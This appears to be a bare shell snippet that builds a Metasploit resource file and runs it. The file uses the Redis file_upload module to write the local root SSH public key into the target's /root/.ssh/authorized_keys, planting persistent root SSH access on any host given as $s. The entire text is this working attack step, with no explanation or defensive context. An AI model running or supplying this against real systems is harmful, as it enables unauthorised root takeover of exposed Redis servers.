echo 'use auxiliary/scanner/redis/file_upload
set rhosts '$s'
set LocalFile /root/.ssh/id_rsa.pub 
set RemoteFile /root/.ssh/authorized_keys
run
' > $s.rc
msfconsole -r $s.rc